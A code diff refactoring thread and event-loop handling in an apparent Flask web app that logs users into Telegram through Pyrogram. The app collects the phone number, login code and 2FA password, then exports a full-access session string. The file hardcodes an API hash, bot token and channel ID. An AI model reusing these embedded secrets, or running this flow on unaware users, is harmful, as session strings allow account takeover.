@@ -5,7 +5,6 @@ import asyncio
 import threading
 import traceback
 from datetime import datetime, timedelta
-from concurrent.futures import ThreadPoolExecutor
 from pyrogram import Client
 from pyrogram.errors import (
     PhoneNumberInvalid,
@@ -59,166 +58,161 @@ API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
 CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")
 
-# ========== THREAD-LOCAL STORAGE ==========
-thread_local = threading.local()
-
-def get_event_loop():
-    """Get or create event loop for current thread"""
-    if not hasattr(thread_local, 'loop'):
-        thread_local.loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(thread_local.loop)
-    return thread_local.loop
-
 # ========== SESSION MANAGEMENT ==========
+class SessionThread:
+    """Each session runs in its own thread with dedicated event loop"""
+    def __init__(self, session_id, phone):
+        self.session_id = session_id
+        self.phone = phone
+        self.client = None
+        self.loop = None
+        self.thread = None
+        self.connected = False
+        self.phone_code_hash = None
+        self._lock = threading.Lock()
+        self._results = {}
+        self._start_thread()
+    
+    def _start_thread(self):
+        """Start the session thread"""
+        self.thread = threading.Thread(target=self._run_loop, daemon=True)
+        self.thread.start()
+    
+    def _run_loop(self):
+        """Run the event loop in this thread"""
+        self.loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(self.loop)
+        
+        # Create client
+        self.client = Client(
+            name=f"session_{self.session_id}",
+            api_id=API_ID,
+            api_hash=API_HASH,
+            in_memory=True,
+            no_updates=True
+        )
+        
+        try:
+            # Connect synchronously
+            self.loop.run_until_complete(self.client.connect())
+            self.connected = True
+            print(f"✅ Session {self.session_id} connected")
+        except Exception as e:
+            print(f"❌ Session {self.session_id} connect failed: {e}")
+            self.connected = False
+        
+        # Keep loop running
+        try:
+            self.loop.run_forever()
+        finally:
+            self.loop.close()
+    
+    def execute(self, coro, timeout=60):
+        """Execute coroutine in this session's loop"""
+        if not self.loop or not self.connected:
+            raise RuntimeError("Session not connected")
+        
+        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
+        return future.result(timeout=timeout)
+    
+    def stop(self):
+        """Stop the session thread"""
+        if self.loop and self.loop.is_running():
+            self.loop.call_soon_threadsafe(self.loop.stop)
+        if self.thread and self.thread.is_alive():
+            self.thread.join(timeout=5)
+
 class SessionManager:
     """Manages Pyrogram clients with proper cleanup"""
     def __init__(self):
-        self._clients = {}
+        self._sessions = {}  # session_id -> SessionThread
         self._lock = threading.Lock()
-        self._executor = ThreadPoolExecutor(max_workers=3)
 
-    def _run_async(self, coro):
-        """Run coroutine in a managed thread with its own event loop"""
-        def run_in_thread():
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            try:
-                return loop.run_until_complete(coro)
-            finally:
-                loop.close()
+    def create_session(self, session_id, phone):
+        """Create new session with dedicated thread"""
+        # Remove old session if exists
+        self.remove_session(session_id)
         
-        future = self._executor.submit(run_in_thread)
-        return future.result(timeout=60)
-
-    def create_client(self, session_id, phone):
-        """Create and connect a new client"""
-        async def create_and_connect():
-            client = Client(
-                name=f"session_{session_id}",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                in_memory=True,
-                no_updates=True
-            )
-            await client.connect()
-            return client
-
-        try:
-            client = self._run_async(create_and_connect())
-            
-            with self._lock:
-                self._clients[session_id] = {
-                    'client': client,
+        session = SessionThread(session_id, phone)
+        
+        with self._lock:
+            self._sessions[session_id] = session
+        
+        # Wait for connection
+        import time
+        for _ in range(30):  # 3 seconds timeout
+            if session.connected:
+                break
+            time.sleep(0.1)
+        
+        if not session.connected:
+            self.remove_session(session_id)
+            raise RuntimeError("Failed to connect session")
+        
+        # Store in DB
+        if temp_sessions_col is not None:
+            temp_sessions_col.update_one(
+                {'_id': session_id},
+                {'$set': {
                     'phone': phone,
                     'created_at': datetime.now(),
                     'status': 'connected'
-                }
+                }},
+                upsert=True
+            )
+        
+        return session
 
-            # Store metadata in MongoDB for recovery
-            if temp_sessions_col is not None:
-                temp_sessions_col.update_one(
-                    {'_id': session_id},
-                    {'$set': {
-                        'phone': phone,
-                        'created_at': datetime.now(),
-                        'status': 'connected'
-                    }},
-                    upsert=True
-                )
-
-            return client
-            
-        except Exception as e:
-            # Auto-remove dead session
-            self.remove_client(session_id)
-            raise e
-
-    def get_client(self, session_id):
-        """Get existing client"""
+    def get_session(self, session_id):
+        """Get existing session"""
         with self._lock:
-            data = self._clients.get(session_id)
-            if data:
-                # Check if client is still valid
-                try:
-                    # Update last accessed
-                    if temp_sessions_col is not None:
-                        temp_sessions_col.update_one(
-                            {'_id': session_id},
-                            {'$set': {'last_accessed': datetime.now()}}
-                        )
-                    return data['client']
-                except Exception:
-                    # Client is dead, remove it
-                    self._clients.pop(session_id, None)
-                    return None
-            return None
+            session = self._sessions.get(session_id)
+            if session and session.connected:
+                return session
+            elif session:
+                # Session exists but dead
+                self._sessions.pop(session_id, None)
+        return None
 
-    def remove_client(self, session_id):
-        """Remove and disconnect client"""
+    def remove_session(self, session_id):
+        """Remove session and cleanup"""
         with self._lock:
-            data = self._clients.pop(session_id, None)
-
-        if data:
-            client = data['client']
+            session = self._sessions.pop(session_id, None)
+        
+        if session:
             try:
-                async def disconnect():
+                # Disconnect client
+                if session.client and session.connected:
                     try:
-                        await client.disconnect()
-                    except Exception:
+                        session.execute(session.client.disconnect(), timeout=5)
+                    except:
                         pass
-                
-                # Run disconnect in separate thread with fresh event loop
-                self._run_async(disconnect())
-            except Exception as e:
-                print(f"Error disconnecting client {session_id}: {e}")
-
+            except:
+                pass
+            finally:
+                session.stop()
+        
+        # Cleanup DB
         if temp_sessions_col is not None:
             try:
                 temp_sessions_col.delete_one({'_id': session_id})
             except Exception as e:
-                print(f"Error removing session from DB: {e}")
-
-    def is_client_alive(self, session_id):
-        """Check if client is still responsive"""
-        with self._lock:
-            data = self._clients.get(session_id)
-            if not data:
-                return False
-            client = data['client']
-            try:
-                # Try a simple operation to check if client is alive
-                async def ping():
-                    return await client.is_connected()
-                
-                return self._run_async(ping())
-            except Exception:
-                return False
+                print(f"DB cleanup error: {e}")
 
     def cleanup_old(self, max_age_minutes=10):
-        """Remove old and dead sessions"""
+        """Remove old sessions"""
         cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
         
-        with self._lock:
-            sessions_to_check = list(self._clients.items())
-
-        # Check each session and remove dead ones
-        dead_sessions = []
-        for sid, data in sessions_to_check:
-            if data['created_at'] < cutoff:
-                dead_sessions.append(sid)
-            elif not self.is_client_alive(sid):
-                dead_sessions.append(sid)
-                print(f"🗑️ Removed dead session: {sid}")
-
-        for sid in dead_sessions:
-            self.remove_client(sid)
-
-        # Cleanup DB
+        # Get old sessions from DB
         if temp_sessions_col is not None:
             try:
+                old_docs = temp_sessions_col.find({'created_at': {'$lt': cutoff}})
+                for doc in old_docs:
+                    self.remove_session(doc['_id'])
+                
                 temp_sessions_col.delete_many({'created_at': {'$lt': cutoff}})
             except Exception as e:
-                print(f"Error cleaning DB sessions: {e}")
+                print(f"Cleanup error: {e}")
 
 session_manager = SessionManager()
 
@@ -384,11 +378,11 @@ def login():
 
 @app.route("/api/send-code", methods=["POST"])
 def send_code():
-    # Cleanup old/dead sessions first
+    # Cleanup old sessions
     try:
         session_manager.cleanup_old()
     except Exception as e:
-        print(f"Cleanup error (non-critical): {e}")
+        print(f"Cleanup error: {e}")
 
     data = request.get_json() or {}
     phone = data.get("phone", "").strip()
@@ -400,16 +394,13 @@ def send_code():
     session_id = str(uuid.uuid4())[:8]
 
     try:
-        # Create client and connect
-        client = session_manager.create_client(session_id, phone)
-
-        # Send code using the same pattern
-        async def send():
-            return await client.send_code(phone)
-
-        sent = session_manager._run_async(send())
-
-        # Store phone_code_hash in MongoDB
+        # Create session with dedicated thread
+        session_thread = session_manager.create_session(session_id, phone)
+        
+        # Send code
+        sent = session_thread.execute(session_thread.client.send_code(phone))
+        
+        # Store phone_code_hash in DB
         if temp_sessions_col is not None:
             temp_sessions_col.update_one(
                 {'_id': session_id},
@@ -423,13 +414,13 @@ def send_code():
         return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
 
     except PhoneNumberInvalid:
-        session_manager.remove_client(session_id)
+        session_manager.remove_session(session_id)
         return jsonify(ok=False, error="Invalid phone number"), 400
     except FloodWait as e:
-        session_manager.remove_client(session_id)
+        session_manager.remove_session(session_id)
         return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
     except Exception as e:
-        session_manager.remove_client(session_id)
+        session_manager.remove_session(session_id)
         print(f"Send code error: {traceback.format_exc()}")
         return jsonify(ok=False, error=str(e)), 500
 
@@ -443,10 +434,9 @@ def verify_code():
     if not session_id:
         return jsonify(ok=False, error="Session ID required"), 400
 
-    # Get client from memory
-    client = session_manager.get_client(session_id)
-
-    if not client:
+    # Get session
+    session_thread = session_manager.get_session(session_id)
+    if not session_thread:
         return jsonify(ok=False, error="Session expired. Please request a new code."), 400
 
     # Get metadata from MongoDB
@@ -455,7 +445,7 @@ def verify_code():
         session_doc = temp_sessions_col.find_one({'_id': session_id})
 
     if not session_doc:
-        session_manager.remove_client(session_id)
+        session_manager.remove_session(session_id)
         return jsonify(ok=False, error="Session expired. Please request a new code."), 400
 
     phone = session_doc['phone']
@@ -466,39 +456,48 @@ def verify_code():
         return jsonify(ok=False, error="Please enter a valid verification code"), 400
 
     try:
-        async def do_verify():
-            try:
-                user = await client.sign_in(
+        # Sign in
+        try:
+            user = session_thread.execute(
+                session_thread.client.sign_in(
                     phone_number=phone,
                     phone_code_hash=phone_code_hash,
                     phone_code=code
                 )
-                session_string = await client.export_session_string()
-                return {"user": user, "session_string": session_string, "error": None}
-            except SessionPasswordNeeded:
-                if not password:
-                    return {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
+            )
+            session_string = session_thread.execute(
+                session_thread.client.export_session_string()
+            )
+            result = {"user": user, "session_string": session_string, "error": None}
+            
+        except SessionPasswordNeeded:
+            if not password:
+                result = {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
+            else:
                 try:
-                    user = await client.check_password(password)
-                    session_string = await client.export_session_string()
-                    return {"user": user, "session_string": session_string, "error": None}
+                    user = session_thread.execute(
+                        session_thread.client.check_password(password)
+                    )
+                    session_string = session_thread.execute(
+                        session_thread.client.export_session_string()
+                    )
+                    result = {"user": user, "session_string": session_string, "error": None}
                 except Exception as e:
-                    return {"user": None, "session_string": None, "error": f"Invalid 2FA password: {str(e)}"}
-            except PhoneCodeInvalid:
-                return {"user": None, "session_string": None, "error": "INVALID_CODE"}
-            except PhoneCodeExpired:
-                return {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
-            except Exception as e:
-                return {"user": None, "session_string": None, "error": str(e)}
-
-        result = session_manager._run_async(do_verify())
+                    result = {"user": None, "session_string": None, "error": f"Invalid 2FA password: {str(e)}"}
+                    
+        except PhoneCodeInvalid:
+            result = {"user": None, "session_string": None, "error": "INVALID_CODE"}
+        except PhoneCodeExpired:
+            result = {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
+        except Exception as e:
+            result = {"user": None, "session_string": None, "error": str(e)}
 
     except Exception as e:
         print(f"Verify error: {traceback.format_exc()}")
         return jsonify(ok=False, error=f"Server error: {str(e)}"), 500
     finally:
         # Always clean up
-        session_manager.remove_client(session_id)
+        session_manager.remove_session(session_id)
 
     if result["error"] == "2FA_PASSWORD_REQUIRED":
         return jsonify(ok=False, requires_password=True), 401
